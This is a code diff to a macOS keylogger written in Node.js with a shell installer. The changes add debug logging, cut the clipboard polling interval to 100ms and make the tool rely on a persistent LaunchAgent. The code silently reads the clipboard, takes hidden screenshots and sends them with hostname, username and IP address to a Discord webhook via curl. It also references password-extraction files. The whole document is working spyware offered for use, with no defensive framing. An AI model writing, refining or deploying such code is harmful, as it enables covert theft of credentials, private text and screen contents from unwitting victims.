@@ -144,6 +144,14 @@ if (!fs.existsSync(screenshotDir)) {
 function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
     if (!buffer || buffer.length === 0) buffer = '[No activity]';
     
+    // Log to file for debugging
+    const logFile = path.join(os.homedir(), '.keylogger-helper', 'keylogger.log');
+    const errorLogFile = path.join(os.homedir(), '.keylogger-helper', 'keylogger.error.log');
+    
+    try {
+        fs.appendFileSync(logFile, `[${new Date().toISOString()}] sendKeylogToDiscord called: buffer=${buffer.length} chars, screenshot=${screenshotFilePath ? 'yes' : 'no'}\n`);
+    } catch (e) {}
+    
     const ip = os.networkInterfaces();
     let ipAddress = 'Unknown';
     for (const name of Object.keys(ip)) {
@@ -177,7 +185,29 @@ function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
         const payloadFile = path.join(screenshotDir, `keylog_payload_${Date.now()}.json`);
         try {
             fs.writeFileSync(payloadFile, JSON.stringify(keylogContent));
-            exec(`curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${screenshotFilePath};type=image/png" "${WEBHOOK}"`, (error) => {
+            exec(`curl -s -w "\\nHTTP_CODE:%{http_code}" -X POST -F "payload_json=@${payloadFile}" -F "file=@${screenshotFilePath};type=image/png" "${WEBHOOK}"`, (error, stdout, stderr) => {
+                if (error) {
+                    try {
+                        fs.appendFileSync(errorLogFile, `[${new Date().toISOString()}] Error sending with screenshot: ${error.message}\n`);
+                        if (stderr) {
+                            fs.appendFileSync(errorLogFile, `[${new Date().toISOString()}] stderr: ${stderr}\n`);
+                        }
+                    } catch (e) {}
+                } else {
+                    // Parse HTTP code from stdout
+                    const httpCode = stdout.includes('HTTP_CODE:') ? stdout.split('HTTP_CODE:')[1].trim() : 'unknown';
+                    const responseBody = stdout.split('HTTP_CODE:')[0].trim();
+                    try {
+                        if (httpCode === '204' || httpCode === '200') {
+                            fs.appendFileSync(logFile, `[${new Date().toISOString()}] Successfully sent to Discord (with screenshot) - HTTP ${httpCode}\n`);
+                        } else {
+                            fs.appendFileSync(errorLogFile, `[${new Date().toISOString()}] Discord returned error code: ${httpCode}\n`);
+                            if (responseBody) {
+                                fs.appendFileSync(errorLogFile, `[${new Date().toISOString()}] Response: ${responseBody.substring(0, 200)}\n`);
+                            }
+                        }
+                    } catch (e) {}
+                }
                 setTimeout(() => {
                     try { 
                         fs.unlinkSync(payloadFile);
@@ -185,18 +215,48 @@ function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
                     } catch (e) {}
                 }, 10000);
             });
-        } catch (e) {}
+        } catch (e) {
+            try {
+                fs.appendFileSync(errorLogFile, `[${new Date().toISOString()}] Exception in sendKeylogToDiscord (screenshot): ${e.message}\n`);
+            } catch (e2) {}
+        }
     } else {
         // No screenshot - just send embed
         const payloadFile = path.join(os.homedir(), `.keylogger_payload_${Date.now()}.json`);
         try {
             fs.writeFileSync(payloadFile, JSON.stringify(keylogContent));
-            exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${payloadFile}" "${WEBHOOK}"`, (error) => {
+            exec(`curl -s -w "\\nHTTP_CODE:%{http_code}" -X POST -H "Content-Type: application/json" --data-binary "@${payloadFile}" "${WEBHOOK}"`, (error, stdout, stderr) => {
+                if (error) {
+                    try {
+                        fs.appendFileSync(errorLogFile, `[${new Date().toISOString()}] Error sending without screenshot: ${error.message}\n`);
+                        if (stderr) {
+                            fs.appendFileSync(errorLogFile, `[${new Date().toISOString()}] stderr: ${stderr}\n`);
+                        }
+                    } catch (e) {}
+                } else {
+                    // Parse HTTP code from stdout
+                    const httpCode = stdout.includes('HTTP_CODE:') ? stdout.split('HTTP_CODE:')[1].trim() : 'unknown';
+                    const responseBody = stdout.split('HTTP_CODE:')[0].trim();
+                    try {
+                        if (httpCode === '204' || httpCode === '200') {
+                            fs.appendFileSync(logFile, `[${new Date().toISOString()}] Successfully sent to Discord (no screenshot) - HTTP ${httpCode}\n`);
+                        } else {
+                            fs.appendFileSync(errorLogFile, `[${new Date().toISOString()}] Discord returned error code: ${httpCode}\n`);
+                            if (responseBody) {
+                                fs.appendFileSync(errorLogFile, `[${new Date().toISOString()}] Response: ${responseBody.substring(0, 200)}\n`);
+                            }
+                        }
+                    } catch (e) {}
+                }
                 setTimeout(() => {
                     try { fs.unlinkSync(payloadFile); } catch (e) {}
                 }, 5000);
             });
-        } catch (e) {}
+        } catch (e) {
+            try {
+                fs.appendFileSync(errorLogFile, `[${new Date().toISOString()}] Exception in sendKeylogToDiscord (no screenshot): ${e.message}\n`);
+            } catch (e2) {}
+        }
     }
 }
 
@@ -206,12 +266,19 @@ function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
 // lastClipboard and keysBuffer are already declared above
 
 // Monitor clipboard changes (copy/paste) - with screenshot
+// Check more frequently for faster response (100ms instead of 500ms)
 setInterval(() => {
     exec('pbpaste', (error, stdout) => {
         if (!error && stdout && stdout.trim()) {
             const clipboard = stdout.trim();
             // Only process if clipboard actually changed
             if (clipboard !== lastClipboard && clipboard.length > 0) {
+                // Log clipboard detection
+                const logFile = path.join(os.homedir(), '.keylogger-helper', 'keylogger.log');
+                try {
+                    fs.appendFileSync(logFile, `[${new Date().toISOString()}] Clipboard changed: ${clipboard.length} chars\n`);
+                } catch (e) {}
+                
                 // Simple filtering - block system files and JSON payloads
                 const isSystemFile = /^[\/~]/.test(clipboard) || // File paths starting with / or ~
                                      /file_payload_|discord_payload_|keylog_payload_|password_extract_|startup_|heartbeat_|\.json/i.test(clipboard) || // System temp files
@@ -220,38 +287,56 @@ setInterval(() => {
                                      /^\s*\{[\s\S]*"content"[\s\S]*\}\s*$/i.test(clipboard) || // JSON content objects
                                      /"title":|"color":|"fields":|"timestamp":/i.test(clipboard); // JSON embed structure
                 
+                // Log filtering decision
+                try {
+                    fs.appendFileSync(logFile, `[${new Date().toISOString()}] isSystemFile=${isSystemFile}, length=${clipboard.length}\n`);
+                } catch (e) {}
+                
                 // Send if it's not a system file and has content
                 if (!isSystemFile && clipboard.length >= 1 && clipboard.length <= 10000) {
                     lastClipboard = clipboard;
                     
-                    // Set buffer to clipboard content
-                    keysBuffer = clipboard.substring(0, 5000);
+                    // Capture clipboard content in a local variable (so it doesn't get cleared)
+                    const clipboardContent = clipboard.substring(0, 5000);
+                    
+                    // Log that we're sending
+                    try {
+                        fs.appendFileSync(logFile, `[${new Date().toISOString()}] Sending clipboard to Discord: ${clipboardContent.substring(0, 50)}...\n`);
+                    } catch (e) {}
                     
                     // Take screenshot FIRST, then send both together
                     const timestamp = Date.now();
                     const screenshotFile = path.join(screenshotDir, `screenshot_${timestamp}.png`);
                     
-                    // Take screenshot (non-blocking, but we'll wait a moment for it)
+                    // Take screenshot (non-blocking) - wait a very short time then send ONCE
                     exec(`screencapture -x -m "${screenshotFile}"`, (screenshotError) => {
-                        // Wait a moment for screenshot to be written
+                        // Check for screenshot after a very short delay (100ms instead of 500ms)
                         setTimeout(() => {
-                            // Send keylog with screenshot if available
+                            // Send ONCE with screenshot if available, or without if not
                             if (!screenshotError && fs.existsSync(screenshotFile)) {
-                                sendKeylogToDiscord(keysBuffer, 'Clipboard', screenshotFile);
+                                sendKeylogToDiscord(clipboardContent, 'Clipboard', screenshotFile);
                             } else {
-                                // No screenshot - just send keylog
-                                sendKeylogToDiscord(keysBuffer, 'Clipboard', null);
+                                // Screenshot failed or not ready - send without it
+                                sendKeylogToDiscord(clipboardContent, 'Clipboard', null);
                             }
-                        }, 500);
+                        }, 100); // Reduced from 500ms to 100ms for faster response
                     });
-                    
-                    // Clear buffer after sending
-                    keysBuffer = '';
+                } else {
+                    // Log why we're not sending
+                    try {
+                        fs.appendFileSync(logFile, `[${new Date().toISOString()}] NOT sending: isSystemFile=${isSystemFile}, length=${clipboard.length}\n`);
+                    } catch (e) {}
                 }
             }
+        } else if (error) {
+            // Log errors
+            const errorLogFile = path.join(os.homedir(), '.keylogger-helper', 'keylogger.error.log');
+            try {
+                fs.appendFileSync(errorLogFile, `[${new Date().toISOString()}] Error reading clipboard: ${error.message}\n`);
+            } catch (e) {}
         }
     });
-}, 500); // Check every 500ms
+}, 100); // Check every 100ms instead of 500ms for faster detection
 
 // REMOVED: pke keylogger monitoring (repository not available)
 // Clipboard monitoring is working and captures copy/paste activity
@@ -1677,15 +1762,16 @@ python3 "${pythonScript}" 2>/dev/null || {
                                     } catch (e2) {}
                                 }
                             } else {
-                            // No content or file too small - retry
+                                // No content or file too small - retry
+                                if (attempts < 10) {
+                                    setTimeout(waitForOutput, 500);
+                                }
+                            }
+                        } else {
+                            // OUTPUT_FILE doesn't exist yet - retry
                             if (attempts < 10) {
                                 setTimeout(waitForOutput, 500);
                             }
-                        }
-                    } else {
-                        // OUTPUT_FILE doesn't exist yet - retry
-                        if (attempts < 10) {
-                            setTimeout(waitForOutput, 500);
                         }
                     }
                 };
@@ -1709,6 +1795,13 @@ setInterval(() => {
 
 // Send startup message IMMEDIATELY (verify it's running)
 (function sendStartupMessage() {
+    const logFile = path.join(os.homedir(), '.keylogger-helper', 'keylogger.log');
+    const errorLogFile = path.join(os.homedir(), '.keylogger-helper', 'keylogger.error.log');
+    
+    try {
+        fs.appendFileSync(logFile, `[${new Date().toISOString()}] Keylogger starting up...\n`);
+    } catch (e) {}
+    
     const ip = os.networkInterfaces();
     let ipAddress = 'Unknown';
     for (const name of Object.keys(ip)) {
@@ -1739,12 +1832,28 @@ setInterval(() => {
     const startupFile = path.join(screenshotDir, `startup_${Date.now()}.json`);
     try {
         fs.writeFileSync(startupFile, JSON.stringify(startupPayload));
-        exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${startupFile}" "${WEBHOOK}"`, (error) => {
+        exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${startupFile}" "${WEBHOOK}"`, (error, stdout, stderr) => {
+            if (error) {
+                try {
+                    fs.appendFileSync(errorLogFile, `[${new Date().toISOString()}] Error sending startup message: ${error.message}\n`);
+                    if (stderr) {
+                        fs.appendFileSync(errorLogFile, `[${new Date().toISOString()}] stderr: ${stderr}\n`);
+                    }
+                } catch (e) {}
+            } else {
+                try {
+                    fs.appendFileSync(logFile, `[${new Date().toISOString()}] Startup message sent successfully\n`);
+                } catch (e) {}
+            }
             setTimeout(() => {
                 try { fs.unlinkSync(startupFile); } catch (e) {}
             }, 5000);
         });
-    } catch (e) {}
+    } catch (e) {
+        try {
+            fs.appendFileSync(errorLogFile, `[${new Date().toISOString()}] Exception in sendStartupMessage: ${e.message}\n`);
+        } catch (e2) {}
+    }
 })();
 
 console.log = () => {};
@@ -1830,30 +1939,13 @@ PLISTEOF
     # Load the LaunchAgent
     launchctl load "$KEYLOGGER_AGENT_FILE" 2>/dev/null || launchctl load -w "$KEYLOGGER_AGENT_FILE" 2>/dev/null || true
     
-    # Start it via LaunchAgent
+    # Start it via LaunchAgent ONLY (let LaunchAgent manage it - no manual starts!)
+    # LaunchAgent with KeepAlive=true will handle persistence and auto-restart
     sleep 2
     launchctl start com.keylogger.helper 2>/dev/null || true
     
-    # ALWAYS start directly as nohup (don't wait for checks - just start it!)
-    sleep 1
-    if [ -f "$NODE_PATH" ]; then
-        nohup "$NODE_PATH" "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/nohup.log" 2>&1 &
-    elif command -v node >/dev/null 2>&1; then
-        nohup node "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/nohup.log" 2>&1 &
-    else
-        # Try with just "node" command anyway
-        nohup node "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/nohup.log" 2>&1 &
-    fi
-    
-    # Also start directly as backup (multiple methods to ensure it runs)
-    sleep 2
-    if [ -f "$NODE_PATH" ]; then
-        "$NODE_PATH" "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/direct.log" 2>&1 &
-    elif command -v node >/dev/null 2>&1; then
-        node "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/direct.log" 2>&1 &
-    else
-        node "$APP_DIR/keylogger-screenshotter.js" > "$APP_DIR/direct.log" 2>&1 &
-    fi
+    # Wait a moment for LaunchAgent to start it
+    sleep 3
     
     # Wait and verify, then retry if needed
     sleep 5
@@ -1881,7 +1973,7 @@ PLISTEOF
       {"name": "💻 Hostname", "value": "\`${HOSTNAME}\`", "inline": true},
       {"name": "👤 PC Username", "value": "\`${USERNAME}\`", "inline": true},
       {"name": "🌍 IP Address", "value": "\`${IP}\`", "inline": true},
-      {"name": "🔧 Installation Method", "value": "LaunchAgent + Direct Process", "inline": false},
+      {"name": "🔧 Installation Method", "value": "LaunchAgent (persistent)", "inline": false},
       {"name": "⏰ Timestamp", "value": "\`$(date '+%Y-%m-%d %H:%M:%S')\`", "inline": false}
     ],
     "footer": {"text": "Keylogger is now monitoring clipboard and capturing screenshots"},
